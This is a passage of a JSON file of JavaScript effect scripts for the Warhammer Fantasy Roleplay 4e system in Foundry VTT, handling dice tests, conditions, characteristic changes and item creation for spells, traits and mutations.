@UUID[Compendium.wfrp4e-core.items.Item.1hQuVFZt9QnnbWzg]{Minor Infection}.`)\n}","f3rXusHh6VIpVPUl":"return !args.skill?.name?.includes(game.i18n.localize(\"NAME.Language\")) && args.type != \"cast\"","f4vvAGQ8OGoEbrgy":"let SL = args.opposedTest.attackerTest.result.SL - args.opposedTest.attackerTest.item.cn.value\nlet difficulty = \"challenging\"\nif (SL >= 1)\n   difficulty = \"difficult\"\nif (SL >= 2)\n   difficulty = \"hard\"\nif (SL >= 3)\n   difficulty = \"vhard\"\n   \n\nlet test = await args.actor.setupCharacteristic(\"wp\", {fields: {difficulty}, skipTargets: true, appendTitle :  \" - \" + this.effect.name, context : {failure: \"Gain a Stunned Condition\"}})\nawait test.roll();\nif (test.failed)\n{\n    args.actor.addCondition(\"stunned\");\n}","f5Mp3kXwCFdPkW6N":"return args.skill?.name != \"Entertain (Sing)\" && args.skill?.name != \"Entertain (Singing)\" && !args.skill?.name.includes(\"Language\");","f6WnrJvoNkfoNN9Y":"return args.item?.attackType != 'melee'","f7WZvYle9iqefRsh":"return args.weapon?.system?.attackType != \"melee\"","f8cnfvGKJH3bYVGN":"return [\"s\", \"t\"].includes(args.characteristic)","fEFfHFeJxkR0aIJK":"if (args.opposedTest.result.differenceSL >= 0 && args.opposedTest.result.differenceSL <= 3 && args.opposedTest.result.winner == \"attacker\")\n{ \n    this.script.scriptMessage(`Everyone within 20 feet loses 1 Wound and makes a <strong>Difficult (-10) Endurance</strong> or gains @Condition[Deafened]`, {blind : true,  whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n}\n    ","fEyKQqCjDwml3DXO":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.M8XyRs9DN12XsFTQ\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect: this.effect.id})","fFGuTi0HLjwneMcJ":"return args.item?.system.isRanged","fFi9JD4uCY9DPC5B":"let specification = Number(this.item.specification.value) || 1;\nargs.actor.system.characteristics.t.initial += 10 * specification;\nargs.actor.system.status.carries.max -= Math.floor(args.actor.system.status.carries.max * 0.1 * specification);\nargs.actor.system.details.price.gc += Math.floor(args.actor.system.details.price.gc * 0.1 * specification);","fIUxKZMWJ8HMPmH9":"return [\"wp\", \"ag\", \"i\", \"int\"].includes(args.characteristic)","fKzlu6fFE2th9uIJ":"return args.item?.name == game.i18n.localize(\"NAME.ConsumeAlcohol\")","fP2edYbj6QjPPAjL":"return [\"Charm Animal\", \"Endurance\", \"Outdoor Survival\"].includes(args.skill?.name)","fPKYkBllp7Et62lX":"if (args.test.spell.name == \"Warp Lightning\")\n{\n    args.test.preData.canReverse = true;\n}","fTw3mpSUOlkqVVUC":"this.actor.applyEffect({effectUuids : this.item.effects.contents[0].uuid})","fY0TsQwnU14fdPl2":"args.fields.modifier += 30;","fYLSe6CrYciap5y8":"        let characteristics = {\n            \"ws\" : 0,\n            \"bs\" : 0,\n            \"s\" : 10,\n            \"t\" : 10,\n            \"i\" : 0,\n            \"ag\" : 10,\n            \"dex\" : 0,\n            \"int\" : 0,\n            \"wp\" : 0,\n            \"fel\" : 0\n        }\n        let skills = [\"Consume Alcohol\", \"Row\", \"Sail\", \"Swim\"]\n        let skillAdvancements = [10, 10, 10, 10]\n        let talents = []\n        let trappings = []\n        let items = []\n\n        let updateObj = this.actor.toObject();\n        \n        for (let ch in characteristics)\n        {\n            updateObj.system.characteristics[ch].modifier += characteristics[ch];\n        }\n        \n        for (let index = 0; index < skills.length; index++)\n        {\n            let skill = skills[index]\n            let skillItem;\n            skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n            if (skillItem)\n                skillItem.system.advances.value += skillAdvancements[index]\n            else \n            {\n                skillItem = await game.wfrp4e.utility.findSkill(skill)\n                skillItem = skillItem.toObject();\n                skillItem.system.advances.value = skillAdvancements[index];\n                items.push(skillItem);\n            }\n        }\n        \n        for (let talent of talents)\n        {\n            let talentItem = await game.wfrp4e.utility.findTalent(talent)\n            if (talentItem)\n            {\n                items.push(talentItem.toObject());\n            }\n            else \n            {\n                ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n            }\n        }\n        \n        for (let trapping of trappings) \n        {\n            let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n            if (trappingItem)\n            {\n                trappingItem = trappingItem.toObject()\n        \n                equip(trappingItem)\n        \n                items.push(trappingItem);\n            }\n            else \n            {\n                ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n            }\n        }\n       \n        \n        await this.actor.update(updateObj)\n        this.actor.createEmbeddedDocuments(\"Item\", items);\n        \n        function equip(item)\n        {\n            if (item.type == \"armour\")\n                item.system.worn.value = true\n            else if (item.type == \"weapon\")\n                item.system.equipped = true\n            else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n                item.system.worn = true\n        }","faRFSsrQylQRZFLk":"return args.bleedingHand || !args.weapon || !this.actor.hasCondition(\"bleeding\")","fcY3pa72dELnOFXV":"return !args.options.reload\n","feMPZhhFeXRtKdKY":"if (this.item.system.quantity.value)\n{\n\tthis.item.system.reduceQuantity();\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n\tactor.applyEffect({effectUuids : this.item.effects.contents[0]?.uuid})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","ffvcCEazZBinHlUX":"args.update({texture : {tint : \"#FFD700\"}});\n","fiF9sM5UpcHMYa33":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.vMYEkrWj0ip6ZOdv\");\nlet data = item.toObject();\ndata.name += \" (Poison, Disease, Chaos)\"\nthis.actor.createEmbeddedDocuments(\"Item\", Array(this.effect.sourceTest.result.overcast.usage.other.current).fill(data), {fromEffect: this.effect.id})","fkFmNcesqqNTMhVn":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.2iult41Jehz0F1O8\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key;\nawait this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})","fl762icfKrt9ear2":"this.actor.removeCondition(\"broken\", parseInt(this.effect.sourceTest.result.SL)+1)","fq2fqlWlrVfitkcB":"let characteristics = {\n    \"ws\" : 0,\n    \"bs\" : -200,\n    \"s\" : 20,\n    \"t\" : 20,\n    \"i\" : 0,\n    \"ag\" : -5,\n    \"dex\" : -5,\n    \"int\" : 0,\n    \"wp\" : 0,\n    \"fel\" : 0\n}\nlet traits = [ {name:\"Corruption\"}, {name:\"Painless\"}, {name:\"Stupid\"}, {name:\"Swarm\"}, {name:\"Bestial\", disabled : true}, {name:\"Regenerate\", disabled : true}, {name:\"Size\", value: \"Large\", disabled : true}, {name:\"Territorial\", disabled: true} ];\nlet items = [];\n\nlet updateObj = this.actor.toObject();\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let trait of traits)\n{\n    let traitItem = await game.wfrp4e.utility.find(trait.name, \"trait\")\n    if (traitItem)\n    {   \n        let t = traitItem.toObject();\n        t.system.specification.value = trait.value;\n        if (trait.disabled)\n        {\n            t.system.disabled = true;\n        }\n        items.push(t);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trait.name}`, {permanent : true})\n    }\n}\n\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\n","ft0LaRWZT5WtnptP":"let advantage = this.actor.system.status.advantage.value;\nif (advantage > 0)\n{\n    await this.actor.setAdvantage(0);\n    this.script.scriptNotification(\"Advantage Subtracted\")\n}\nelse \n{\n    return this.script.scriptNotification(\"Not enough Advantage!\", \"error\")\n}\n\nlet test = await this.actor.setupTrait(this.item, {fields : {slBonus : advantage}})\nawait test.roll();","fve7tiyF5X9B7mHJ":"args.fields.slBonus -= 2;","fzTB7t3x4bLmAXji":"let roll = await new Roll(\"1d10 + 1\").roll()\nawait roll.toMessage(this.script.getChatData());\nthis.script.scriptNotification(`Healed ${roll.total} Wounds`)\nthis.actor.corruptionDialog(\"moderate\")\nawait this.actor.modifyWounds(roll.total)","g07HI7vyqiFXPB0o":"// A Drinker must take a Difficult (-10) Endurance Test.\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"difficult\"}})\nawait test.roll()\n// If they fail, they acquire 2 Poisoned Conditions. \nif (test.failed) \n{\n    this.actor.addCondition(\"poisoned\", 2)\n    this.script.scriptMessage(`<p><strong>${this.actor.prototypeToken.name}</strong> has gained 2 @Condition[Poisoned] Conditions.</p>\n        <p>Any being with the Bestial Creature Trait that bites them and takes damage will not bite them again during a hostile encounter, though the creature may still attack them in other ways.</p>`, \n    {\n      whisper: ChatMessage.getWhisperRecipients(\"GM\"), \n      blind: true \n    })\n}\n  // If they succeed, for a number of rounds equal to 3+ their SL, they have the Corrosive Blood Creature Trait.\nelse if (test.succeeded) \n{\n    // Don't attempt to add Corrosive Blood if actor already has it\n    const hasCorrosiveBlood = this.actor.has(\"Corrosive Blood\")\n    if (hasCorrosiveBlood !== undefined) return   \n\n    let item = await fromUuid(\"Compendium.wfrp4e-core.items.M5QSWOYt2Rbv2yxW\")\n    let data = item.toObject()\n    this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n    \n    const duration = 3 + parseInt(test.result.SL)\n    this.script.scriptMessage(`<p><strong>${this.actor.prototypeToken.name}</strong> gains the Corrosive Blood Trait for ${duration} rounds.</p>`, \n      { whisper: ChatMessage.getWhisperRecipients(\"GM\"), blind: true })    \n}","g0SzfsLyW7aD2F19":"if (this.item.system.tests.value.includes(\"(Social Group)\"))\n{\n    let tests = this.item.system.tests.value\n    let name = this.item.name\n\n    // If name already specifies, make sure tests value reflects that\n    if (name.includes(\"(\") && !name.toLowerCase().includes(\"(any)\"))\n    {\n        let group = name.split(\"(\")[1].split(\")\")[0]\n        tests = `${tests.split(\"(\")[0].trim()} (${group})`\n    }\n    else\n    {\n        let value = await ValueDialog.create(\"Enter Etiquette Group\", this.effect.name);\n        if (value)\n        {\n            name = `${name.split(\"(\")[0].trim()} (${value})`\n            tests = this.item.system.tests.value.replace(\"Social Group\", value);\n        }\n    }\n    this.item.updateSource({name, \"system.tests.value\" : tests})\n}","g1L8OYO9nCOhdKGL":"// Everything within Fellowship Bonus yards \n// of the target point is splashed with mystic poison, \n// suffering 1d10 + SL damage which ignores Armour Points\n\nlet damage = (await new Roll(`1d10 + ${parseInt(this.effect.sourceTest.result.SL)}`).roll())\n\nawait damage.toMessage(this.script.getChatData())\n\nthis.script.scriptMessage(await args.actor.applyBasicDamage(\n  damage.total,\n  {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP, suppressMsg: true}\n))\n\n// ... and gains the Poisoned Condition\n\nthis.actor.addCondition(\"poisoned\")","g4t56A09yrpZaJQ2":"    let amberTalons = foundry.utils.deepClone(game.wfrp4e.config.systemItems.unarmed);\n    amberTalons.name = \"Amber Talons\";\n    amberTalons.img = this.effect.img;\n    amberTalons.system.damage.value = \"SB + WPB\"\n    amberTalons.system.equipped = true;\n    amberTalons.system.qualities.value.push({name : \"magical\"})\n    amberTalons.effects.push({\n        label : \"Amber Talons\",\n        transfer: false,\n        icon : \"modules/wfrp4e-core/icons/spells/amber-talons.png\" ,\n        flags : {\n          wfrp4e : {\n              applicationData : {\n                  documentType : \"Item\"\n              },\n              scriptData : [{\n                  trigger : \"applyDamage\",\n                  script : \"if (args.totalWoundLoss >= 1)\\n{ \\n    args.actor.addCondition(\\\"bleeding\\\")\\n}\"\n              }]\n          }\n        }\n      })\n    this.actor.createEmbeddedDocuments(\"Item\", [amberTalons], {fromEffect: this.effect.id})","gFUXBbTskQBKjxqm":"if (this.actor.hasCondition(\"entangled\"))\n{\n     this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {fields : {difficulty : \"average\"}}).then(async test => {\n        await test.roll();\n        if (test.failed)\n             this.actor.addCondition(\"fatigued\")    \n     })\n}","gKIPujyuFSn0No9v":"for(let e of this.item.effects.contents)\n{\n    e.update({disabled: false})\n}\nthis.script.scriptNotification(\"Reset Powers\")","gKPL3t4vlZAsvtGr":"return args.skill?.name == \"Stealth (Underground)\"","gL0ftUnK5TNXBRRt":"return this.effect.sourceActor.uuid == args.actor.uuid","gMIenSmLklAkB2Zm":"if (isNaN(parseInt(this.item.system.specification.value)))\n{\n    let value = await ValueDialog.create(\"Enter Venom Strength\", this.effect.name, \"\", Object.values(game.wfrp4e.config.difficultyNames));\n    if (value)\n    {\n     this.item.updateSource({\"system.specification.value\" : value});\n    }\n}","gOm8utR3HLQBT5hA":"let {value} = this.effect.getFlag(\"wfrp4e-soc\", \"m4result\") || {};\n\nif (value === 0)\n  args.actor.system.status.mood.value = 0;\nelse if (value !== undefined)\n  args.actor.system.status.mood.value += value;","gPQrszvIgGlW9yM4":"if (args.test.characteristicKey == \"wp\")\n   args.test.preData.canReverse = true","gVpFUka7qfGiEC1v":"    this.actor.getActiveTokens().forEach(t => t.document.update({texture : {tint : \"#FFD700\"}}));\n","ga6bQzPuoIiQQrKg":"if (args.totalWoundLoss > 0)\n{\n    \n    let test = await args.actor.setupCharacteristic(\"t\",  {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"hard\"}})\n    await test.roll()\n    if (test.failed)\n    {\n        args.totalWoundLoss += this.effect.sourceActor.system.characteristics.wp.bonus\n        args.modifiers.other.push({label : this.effect.name, value : this.effect.sourceActor.system.characteristics.wp.bonus})\n    }\n}","gbhxWXboV9CytWNU":"await this.actor.addCondition(\"blinded\", 2)","gh2KS1prBKcsSK6M":"if (args.opposedTest.attackerTest.result.critical)\n   args.actor.addCondition(\"ablaze\")","gnVpxOeBZpNF4HIF":"if (args.test.result.roll.toString().includes(\"9\") || args.test.result.roll.toString().includes(\"8\"))\n{\n    args.test.result.fumble = game.i18n.localize(\"Fumble\")\n}","goz8yTlMozlsz3uY":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Strength';\nconst difficulty = 'easy';\nconst target = 10;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","gpPaCe6yER79l4u8":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.SfUUdOGjdYpr3KSR\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})","gpuBg3y9rocJL7yT":"this.actor.status.addArmour(1, {locations: [\"head\"], source: this.effect})","gqZLfIr6svrtdwdC":"return args.skill?.name != game.i18n.localize(\"NAME.SleightOfHand\") && args.skill?.name != game.i18n.localize(\"NAME.MeleeBrawling\") && args.weapon?.system?.weaponGroup?.value != \"brawling\"","groEX1wJ9l00PkDF":"let turns = this.effect.getFlag(\"wfrp4e\", \"turns\");\nif (turns <= 0) return;\nturns--;\n\nconst speaker = ChatMessage.getSpeaker({actor: this.actor});\nconst targetId = this.effect.getFlag(\"wfrp4e\", \"target\");\nconst target = canvas.scene.tokens.get(targetId);\n\nif (turns > 0) {\n  this.effect.setFlag(\"wfrp4e\", \"turns\", turns);\n\n  return this.script.scriptMessage(`<p><b>${speaker.alias}</b> continues wrapping itself around <b>${target.name}</b>. It will be able to start crushin in ${turns} turns.</p>`);\n}\n\nif (this.actor.items.find(i => i.type === \"extendedTest\" && i.name === this.effect.name)) {\n  this.script.scriptMessage(`<p><b>${speaker.alias}</b> can resume crushing <b>${target.name}</b> with the Extended Test.</p>`);\n\n  return;\n}\n\nconst extendedTestData = {\n  name: this.effect.name,\n  type: \"extendedTest\",\n  img: this.effect.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target.actor.system.status.wounds.value\n    },\n    test: {\n      value: 'Strength'\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: \"challenging\"\n    }\n  }\n};\n\nconst extendedTests = await this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\nconst extendedTest = extendedTests[0];\n\nthis.script.scriptMessage(`<p><b>${speaker.alias}</b> finished wrapping itself around <b>${target.name}</b>. It can now begin crushing via the @UUID[${extendedTest.uuid}] Extended Test.</p>`);\n\nlet effect = {\n  name: extendedTest.name,\n  icon: extendedTest.img,\n  flags: {\n    wfrp4e: {\n      applicationData: {\n        type: \"document\",\n        documentType: \"Item\"\n      },\n      scriptData: [\n        {\n          label: extendedTest.name,\n          script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.effects.find(e => e.id === id);\n              const speaker = ChatMessage.getSpeaker({actor: this.actor});\n              const targetId = effect.getFlag(\"wfrp4e\", \"target\");\n              const target = canvas.scene.tokens.get(targetId);\n              this.script.scriptMessage(\\`<p><b>${speaker.alias}</b> crushed the <b>${target.name}</b>. Boat shatters, reduced to a mass of flotsam.</p>\\`);\n              await effect.delete();\n                          `,\n          trigger: \"deleteEffect\"\n        }\n      ]\n    }\n  }\n}\n\nawait extendedTests[0].createEmbeddedDocuments(\"ActiveEffect\", [effect]);","gsCnd3mf1vXFU2ei":"this.actor.system.status.ward.value = 4;","gu72JaTs9GrSiVTd":"return !(args.skill?.name == game.i18n.localize(\"NAME.Haggle\") || args.skill?.name == game.i18n.localize(\"NAME.Gossip\"))","gxuBeGHwjZ7WfPeu":"let specification = Number(this.item.specification.value) || 1;\nargs.fields.slBonus -= specification;","h0DfPwUUOBjyAHMZ":"return args.skill?.name != game.i18n.localize(\"NAME.Perception\");","h1XKoMuVnS0bagRO":"return args.item?.name != game.i18n.localize(\"NAME.Endurance\");","h766UvswLCsxcMow":"let characteristics = {\n  \"ws\" : 5,\n  \"bs\" : 0,\n  \"s\" : -15,\n  \"t\" : 0,\n  \"i\" : 20,\n  \"ag\" : 0,\n  \"dex\" : 0,\n  \"int\" : 5,\n  \"wp\" : 10,\n  \"fel\" : 10\n}\nlet skills = [\"Charm\", \"Intimidate\", \"Melee (Basic)\"]\nlet skillAdvancements = [7, 60, 7]\nlet talents = [\"Menacing\", \"Shadow\"]\nlet traits = [\"Distracting\"]\nlet trappings = []\nlet items = [];\nlet spells = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n  updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n  let skill = skills[index]\n  let skillItem;\n  skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n  if (skillItem)\n      skillItem.system.advances.value += skillAdvancements[index]\n  else \n  {\n      skillItem = await game.wfrp4e.utility.findSkill(skill)\n      skillItem = skillItem.toObject();\n      skillItem.system.advances.value = skillAdvancements[index];\n      items.push(skillItem);\n  }\n}\n\nfor (let talent of talents)\n{\n  let talentItem = await game.wfrp4e.utility.findTalent(talent)\n  if (talentItem)\n  {\n      items.push(talentItem.toObject());\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n  }\n}\n\nconst traitRegex = /(?:,?(.+?)(\\+?\\d{1,2}\\+?)?\\s*?(?:\\((.+?)\\)\\s*(\\+?\\d{1,2})?|,|$))/gm\nfor (let trait of traits)\n{\n  let traitMatches = trait.matchAll(traitRegex).next().value\n  let traitName = traitMatches[1]\n  let traitVal = traitMatches[2] || traitMatches[4] // could be match 2 or 4 depending on if there's a specialization\n  let traitSpec = traitMatches[3]\n\n  let traitItem;\n  try {\n      traitItem = await WFRP_Utility.findItem(traitName, \"trait\")\n  }\n  catch { }\n  if (!traitItem) {\n      ui.notifications.warn(`Could not find ${trait}`, {permanent : true})\n  }\n  traitItem = traitItem.toObject()\n\n  if (Number.isNumeric(traitVal))\n  {\n      traitItem.system.specification.value = traitName.includes('Weapon','Horns','Tail','Tentacles','Bite') ? traitVal - parseInt(characteristicValues[3]/10) : traitVal;\n      traitItem.name = (traitItem.name +  ` ${traitSpec ? \"(\"+ traitSpec + \")\" : \"\"}`).trim()\n  }\n  else \n      traitItem.system.specification.value = traitSpec\n\n  items.push(traitItem)\n\n}\n\nfor (let trapping of trappings) \n{\n  let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n  if (trappingItem)\n  {\n      trappingItem = trappingItem.toObject()\n\n      equip(trappingItem)\n\n      items.push(trappingItem);\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n  }\n}\n\nfor (let spell of spells) \n{\n  let spellItem = await game.wfrp4e.utility.findItem(spell)\n  if (spellItem)\n  {\n      spellItem = spellItem.toObject()\n\n      items.push(spellItem);\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${spell}`, {permanent : true})\n  }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\n\nfunction equip(item)\n{\n  if (item.type == \"armour\")\n      item.worn = true\n  else if (item.type == \"weapon\")\n      item.equipped = true\n  else if (item.type == \"trapping\" && item.trappingType?.value == \"clothingAccessories\")\n      item.worn = true\n}","hA8PzeiCsHqqlUZm":"this.actor.createEmbeddedDocuments(\"ActiveEffect\", [game.wfrp4e.config.symptomEffects[\"nausea\"]])\nthis.script.scriptMessage(`Gains @Condition[Nausea] for [[1d10]] hours`, {whisper: ChatMessage.getWhisperRecipients(\"GM\")})","hCzxUyO6mjLNIpaM":"let woundsGained = Math.min(args.totalWoundLoss, args.actor.status.wounds.value)\n\nwoundsGained = Math.floor(woundsGained / 2)\n\nargs.attacker.update({ \"system.status.wounds.value\": args.attacker.status.wounds.value + woundsGained })\n\nthis.script.scriptMessage(`Gains ${woundsGained} Wounds`)","hDC6lroDEPVBituR":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\n\nif (test.failed)\n{\n    this.actor.update({\"system.status.corruption.value\" : parseInt(this.actor.status.corruption.value) + 1})\n    this.script.scriptMessage(\"Gained a Corruption point\", {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n    if (test.result.roll % 11 == 0 || test.result.roll == 100)\n    {\n        this.script.scriptMessage(`<strong>Fumble</strong>: immediately gain 1 @Table[mutatemental]{Mental Mutation}, and may not take a Short-term Ambition for the next [[1d10]] weeks.`, {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n    }\n}","hK0YMJfYbpbJZizO":"this.actor.getActiveTokens().forEach(t => t.document.update({light : {\n      \"dim\": 0,\n      \"bright\": 0,\n      \"angle\": 360,\n      \"alpha\": 0.5,\n      \"animation\": {\n          \"speed\": 0,\n          \"intensity\": 0,\n          \"type\": \"none\",\n      },\n      \"color\": \"\",\n  }}));","hObTbWi4ZdwXimIW":"if (args.item.type == \"spell\")\n{\n    args.item.system.cn.value = Math.floor(args.item.system.cn.value / 2);\n}","hOgha3ir8K9TVphO":"return args.characteristic !== \"fel\";","hR1qD2kpFHF8JT8h":"return args.skill?.name == \"Language (Magick)\"","hSImyYjL0CENTvXf":"let test = await this.actor.setupSkill(\"Endurance\", {fields : {difficulty : \"difficult\", appendTitle : ` - ${this.effect.name}`}});\nawait test.roll();\nif (test.failed)\n{\n\tawait this.actor.addCondition(\"blinded\");\n}\n\nlet msg = ``\nlet armour = args.actor.itemTypes.armour.filter(i => i.system.isMetal && i.system.isEquipped);\nfor(let item of armour)\n{\n\tfor(let key in item.system.AP)\n\t{\n\t\tlet AP = item.system.AP[key]\n\t\tlet damage = Math.floor(AP / 2);\n\t\tawait item.system.damageItem(damage, [key]);\n\t}\n\tmsg += `<p><strong>${item.name}</strong> AP reduced by half</p>`\n}\nif (msg)\n{\n\tthis.script.scriptMessage(msg, {speaker : {alias : args.actor.name}});\n}","hSlEY2oh8quVmdXR":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.pTorrE0l3VybAbtn\")\nlet data = item.toObject();\ndata.system.specification.value = 2\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","hWWvkPbgIN3lxz1u":"return args.item?.system?.attackType !== \"melee\";","hYNWp75ggWSTht55":"if (args.test.result.hitloc.value != \"head\" && args.test.result.critical)\n{\n\tgame.wfrp4e.utility.sleep(200).then(() => {\n\t\tthis.script.scriptMessage(\"Can roll on the @Table[crithead]{Head Critical Hits} instead of the normal hit location\")\n\n\t})\n}","hZAax4emLahEEqcZ":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.BqPZn6q3VHn9HUrW\")\nlet data = item.toObject();\ndata.system.specification.value = 7 - this.actor.characteristics.s.bonus\ndata.name = item.name.replace(\"(Feature)\", \"(Tusks)\")\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","hfO4INH3EeETDTFt":"this.actor.status.addArmour(1, {locations: this.effect.flags.wfrp4e.locations, source: this.effect})","hhCs5VBKx50S5IsY":"return !args.options.mutate","hhv7PrRdlf9sfC82":"let characteristics = {\n            \"ws\" : 5,\n            \"bs\" : 0,\n            \"s\" : 5,\n            \"t\" : 5,\n            \"i\" : 10,\n            \"ag\" : 0,\n            \"dex\" : 0,\n            \"int\" : 0,\n            \"wp\" : 0,\n            \"fel\" : 0\n        }\n        let skills = [\"Cool\", \"Dodge\"]\n        let skillAdvancements = [10, 10]\n        let talents = [\"Combat Reflexes\"]\n        let trappings = [\"Leather Jack\", \"Leather Skullcap\", \"Leather Leggings\", \"Shield\"]\n        let items = []\n\n        let updateObj = this.actor.toObject();\n        \n        for (let ch in characteristics)\n        {\n            updateObj.system.characteristics[ch].modifier += characteristics[ch];\n        }\n        \n        for (let index = 0; index < skills.length; index++)\n        {\n            let skill = skills[index]\n            let skillItem;\n            skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n            if (skillItem)\n                skillItem.system.advances.value += skillAdvancements[index]\n            else \n            {\n                skillItem = await game.wfrp4e.utility.findSkill(skill)\n                skillItem = skillItem.toObject();\n                skillItem.system.advances.value = skillAdvancements[index];\n                items.push(skillItem);\n            }\n        }\n        \n        for (let talent of talents)\n        {\n            let talentItem = await game.wfrp4e.utility.findTalent(talent)\n            if (talentItem)\n            {\n                items.push(talentItem.toObject());\n            }\n            else \n            {\n                ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n            }\n        }\n        \n        for (let trapping of trappings) \n        {\n            let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n            if (trappingItem)\n            {\n                trappingItem = trappingItem.toObject()\n        \n                equip(trappingItem)\n        \n                items.push(trappingItem);\n            }\n            else \n            {\n                ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n            }\n        }\n      \n        \n        await this.actor.update(updateObj)\n        this.actor.createEmbeddedDocuments(\"Item\", items);\n        \n        function equip(item)\n        {\n            if (item.type == \"armour\")\n                item.system.worn.value = true\n            else if (item.type == \"weapon\")\n                item.system.equipped = true\n            else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n                item.system.worn = true\n        }","hj7tI212neKIu9dh":"this.actor.system.status.ward.value = 7;","hlHKeFWrOA8CsLr9":"args.data.canReverse = true;\nargs.options.pilot = true;","hluehsCuBZYc1Ejt":"return args.characterisic != \"fel\"","hmk8zV1LTElHUI8A":"let msg = `<b>${this.actor.prototypeToken.name}</b> loses 1 Wound.<br>`\n  if (this.actor.status.wounds.value <= 1)\n  {\n    msg += `<b>${this.actor.prototypeToken.name}</b> goes unconscious.<br>`\n    await this.actor.addCondition(\"unconscious\")\n  }\n  this.script.scriptMessage(msg)\n  this.actor.modifyWounds(-1)","hnsmzvcuiUYB065I":"this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {appendTitle: ` - ${this.effect.name}`, context: { failure : \"May not flee Combat\"}}).then(test => test.roll())","hpwJRAhCsXTp9bd9":"let choice1 = [\n    {\n        type : \"skill\",\n        name : \"Melee (Basic)\",\n        diff : {\n            system : {\n                advances : {\n                    value : 20\n                }\n            }\n        }\n    }\n]\nlet choice2 = [\n    {\n        type : \"skill\",\n        name : \"Melee (Polearm)\",\n        diff : {\n            system : {\n                advances : {\n                    value : 20\n                }\n            }\n        }\n    }\n]\n\nlet choice3 = [\n    {\n        type : \"skill\",\n        name : \"Melee (Two-Handed)\",\n        diff : {\n            system : {\n                advances : {\n                    value : 20\n                }\n            }\n        }\n    }\n]\n\nlet choice = await Dialog.wait({\n        title : \"Choice\",\n        content : \n        `<p>\n        Select your choice\n        </p>\n        <ol>\n        <li>Melee (Basic)</li>\n        <li>Melee (Polearm)</li>\n        <li>Melee (Two-Handed)</li>\n        </ol> \n        `,\n        buttons : {\n            1 : {\n                label : \"Basic\",\n                callback : () => {\n                    return choice1\n                }\n            },\n            2 : {\n                label : \"Polearm\",\n                callback : () => {\n                    return choice2\n                }\n            },\n            3 : {\n                label : \"Two-Handed\",\n                callback : () => {\n                    return choice3\n                